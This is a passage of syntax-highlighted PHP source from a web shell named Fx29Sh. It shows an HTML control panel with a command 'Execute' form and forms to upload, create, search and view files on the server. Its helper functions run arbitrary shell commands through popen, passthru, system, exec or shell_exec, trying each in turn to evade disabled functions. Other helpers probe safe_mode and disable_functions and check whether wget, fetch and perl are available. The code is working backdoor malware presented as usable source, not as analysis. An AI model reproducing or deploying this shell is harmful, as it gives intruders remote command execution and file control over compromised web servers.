    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;&quot;</span><span class="o">.@</span><span class="nv">$als</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/select&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;label&quot; name=&quot;A1&quot; value=&quot;File:&quot; size=2 disabled&amp;gt;</span>
<span class="x">        &amp;lt;input type=text name=arg1 size=40 value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;A2&quot; size=3 disabled &amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;arg2&quot; size=40 value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg2</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$sh_sourcez</span> <span class="k">as</span> <span class="nv">$e</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;input type=button value=</span><span class="se">\&quot;</span><span class="si">$e\</span><span class="s2">&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;set_arg(&#39;</span><span class="si">$o[0]</span><span class="s2">&#39;,&#39;</span><span class="si">$o[1]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th rowspan=&quot;4&quot;&amp;gt;Filesystem&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;th&amp;gt;Search:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_search&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;search&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;29&quot; value=&quot;(.*)&quot;&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot; checked&amp;gt; regexp &amp;lt;input type=submit name=submit value=&quot;Search&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Upload:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;upload&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot;&amp;gt;</span>
<span class="x">        </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot; Max size: &quot;</span><span class="o">.@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_max_filesize&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;B | Temp dir: &quot;</span><span class="o">.@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_tmp_dir&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Create:&amp;lt;/th&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_mkfile&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;mkfile&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;ft&quot; value=&quot;edit&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;mkfile&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;overwrite&quot; value=&quot;1&quot; checked&amp;gt; Overwrite &amp;lt;input type=submit value=&quot;Create&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;View:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_gofile&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;gofile&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;f&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;View&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">    &amp;lt;div class=&quot;bartitle footer&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">html_footer</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;!-- End of Commands Panel --&amp;gt;</span>
<span class="x">&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;</span>
<span class="x">&amp;lt;/html&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="c1">####################################</span>
<span class="c1">###[ Fx29Sh FUNCTIONS ]###</span>
<span class="c1">####################################</span>
<span class="k">function</span> <span class="nf">safemode</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)</span> <span class="k">OR</span> <span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;on&quot;</span><span class="p">,</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">getdisfunc</span><span class="p">()</span> <span class="p">{</span>
  <span class="nv">$disfunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disfunc</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
    <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="nv">$disfunc</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$disfunc</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">enabled</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nx">getdisfunc</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="c1">###[ FX29EXEC W/ STDERR ]###</span>
<span class="k">function</span> <span class="nf">fx29exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&amp;gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
      <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">###[ FX29EXEC W/O STDERR ]###</span>
<span class="k">function</span> <span class="nf">fx29exec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span> <span class="c1">#Dipindahkan kesini karena menimbulkan masalah pada output control</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&amp;gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
      <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">is_windows</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$pr</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$path</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which </span><span class="si">$pr</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$pr</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">get_status</span><span class="p">()</span> <span class="p">{</span>
  <span class="nv">$arrfunc</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MySQL&quot;</span><span class="p">,</span><span class="s2">&quot;mysql_connect&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MSSQL&quot;</span><span class="p">,</span><span class="s2">&quot;mssql_connect&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Oracle&quot;</span><span class="p">,</span><span class="s2">&quot;ocilogon&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;PostgreSQL&quot;</span><span class="p">,</span><span class="s2">&quot;pg_connect&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Curl&quot;</span><span class="p">,</span><span class="s2">&quot;curl_version&quot;</span><span class="p">),</span>
  <span class="p">);</span>
  <span class="nv">$arrcmd</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Fetch&quot;</span><span class="p">,</span><span class="s2">&quot;fetch --help&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Wget&quot;</span><span class="p">,</span><span class="s2">&quot;wget --help&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Perl&quot;</span><span class="p">,</span><span class="s2">&quot;perl -v&quot;</span><span class="p">),</span>
  <span class="p">);</span>
  <span class="nv">$statinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">function</span> <span class="nf">showstat</span><span class="p">(</span><span class="nv">$sup</span><span class="p">,</span><span class="nv">$stat</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$stat</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &amp;lt;font class=on&amp;gt;ON&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &amp;lt;font class=off&amp;gt;OFF&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrfunc</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$func</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="o">@</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;sockets&#39;</span><span class="p">))</span> <span class="o">?</span> <span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">showstat</span><span class="p">(</span><span class="s2">&quot;Sockets&quot;</span><span class="p">,</span><span class="s2">&quot;off&quot;</span><span class="p">);</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrcmd</span> <span class="k">as</span> <span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">fx29exec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;on&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nv">$statinfo</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">showstat</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s2">&quot;off&quot;</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$statinfo</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">showdisfunc</span><span class="p">()</span> <span class="p">{</span>
  <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nx">getdisfunc</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$disfunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="s1">&#39;&amp;lt;font class=&quot;off&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$disfunc</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s1">&#39;&amp;lt;font class=&quot;on&quot;&amp;gt;NONE&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">disp_drives</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">,</span><span class="nv">$surl</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$letters</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$curdir</span><span class="p">);</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">,</span><span class="s2">&quot;Z&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$letter</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$bool</span> <span class="o">=</span> <span class="nv">$isdiskette</span> <span class="o">=</span> <span class="nv">$letter</span> <span class="o">==</span> <span class="s2">&quot;A&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$bool</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span>
                  <span class="p">(</span><span class="nv">$isdiskette</span><span class="o">?</span><span class="s2">&quot; onclick=</span><span class="se">\&quot;</span><span class="s2">return confirm(&#39;Make sure that the diskette is inserted properly!&#39;)</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; &quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:&quot;</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="nv">$letter</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;font color=#3366FF&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="nv">$letters</span> <span class="o">.=</span> <span class="s2">&quot; &amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
